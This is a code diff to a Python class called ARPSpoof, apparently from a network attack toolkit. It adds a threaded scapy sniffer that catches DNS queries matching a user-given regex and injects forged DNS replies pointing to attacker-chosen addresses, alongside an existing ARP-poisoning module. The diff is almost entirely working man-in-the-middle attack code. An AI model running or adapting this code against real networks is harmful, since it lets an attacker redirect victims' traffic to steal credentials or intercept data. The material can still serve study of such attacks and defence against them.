@@ -101,20 +101,35 @@ class ARPSpoof:
 		return True
 
 	#
+	# Ditto above
+	#
+	def test_stop_dns(self):
+		if self.dns_spoof:
+			return False
+		debug('Stopping DNS spoofer..')
+		return True
+
+	#
 	# Pick up a DNSQR and spoof a DNSRR.
 	#
 	def spoof_dns_record(self, pkt):
-		if DNSQR in pkt and UDP in pkt:
+		if DNSQR in pkt and UDP in pkt and pkt[Ether].src != self.local_mac:
 			for i in self.dns_spoofed_pair.keys():
 				tmp = i.search(pkt[DNSQR].qname)	
-				if not tmp.group(0) is None:
-					#if i in pkt[DNSQR].qname:
+				if not tmp is None and not tmp.group(0) is None:
 					p = Ether(dst=pkt[Ether].src, src=self.local_mac)
 					p /= IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)
 					p /= DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,type='A',rclass='IN',ttl=20000,rdata=self.dns_spoofed_pair[i]),qd=pkt[DNS].qd)
 					sendp(p,count=1)
-					if self.dns_dump: print '[dbg] caught request to ',pkt[DNSQR].qname
+					if self.dns_dump: Msg('Caught request to %s'%pkt[DNSQR].qname)
 		del(pkt)
+
+	#
+	# sniffer for DNS packets
+	#
+	def dns_sniffer(self):
+		debug('Beginning DNS sniffer')
+		sniff(filter='udp and port 53', store=0, prn=self.spoof_dns_record, stopper=self.test_stop_dns,stopperTimeout=3)
 
 	#
 	# initialize a DNS spoofing session for this host.  This was bolted onto the ARP poisoning package because
@@ -122,20 +137,23 @@ class ARPSpoof:
 	#
 	def init_dns_spoof(self):
 		try:
-			dns_name = raw_input('[!] Enter regex to match DNS: ')
+			dns_name = raw_input('[!] Enter regex to match DNS:\t')
 			if dns_name in self.dns_spoofed_pair:
 				Msg('DNS is already being spoofed (%s).'%(self.dns_spoofed_pair[dns_name]))
 				return
 			
-			dns_spoofed = raw_input('[!] Spoof DNS entry matching %s to: '%dns_name)
+			dns_spoofed = raw_input('[!] Spoof DNS entry matching %s to:\t'%dns_name)
 			tmp = raw_input('[!] Spoof DNS record matching \'%s\' to \'%s\'.  Is this correct? '%(dns_name,dns_spoofed))
-			if tmp == 'n':
+			if 'n' in tmp.lower(): 
 				return
 			dns_name = re.compile(dns_name)
 			self.dns_spoofed_pair[dns_name] = dns_spoofed
 			self.dns_spoof = True
-			debug('Starting DNS spoofer...')
-		except Exception:
+			Msg('Starting DNS spoofer...')
+			thread = Thread(target=self.dns_sniffer)
+			thread.start()
+		except Exception, j:
+			print j
 			return
 
 	#
@@ -144,6 +162,7 @@ class ARPSpoof:
 	def stop_dns_spoof(self):
 		if self.dns_spoof:
 			self.dns_spoof = False
+			self.dns_spoofed_pair.clear()
 		return
 	
 	#
@@ -166,19 +185,15 @@ class ARPSpoof:
 		if self.dns_spoof:
 			debug('Stopping DNS spoofer')
 			self.dns_spoof = False
+			self.dns_spoofed_pair.clear()
 		return True
 	
-	#
-	# Check if the module is running
-	#
-	def isRunning(self):
-		return self.spoofing is True 
-
 	#
 	# No view for ARP; if DNS poisoning is started, dump catches 
 	#
 	def view(self):
 		if self.dns_spoof:
+			Msg('Dumping DNS redirections...')	
 			try:
 				while True:
 					self.dns_dump = True
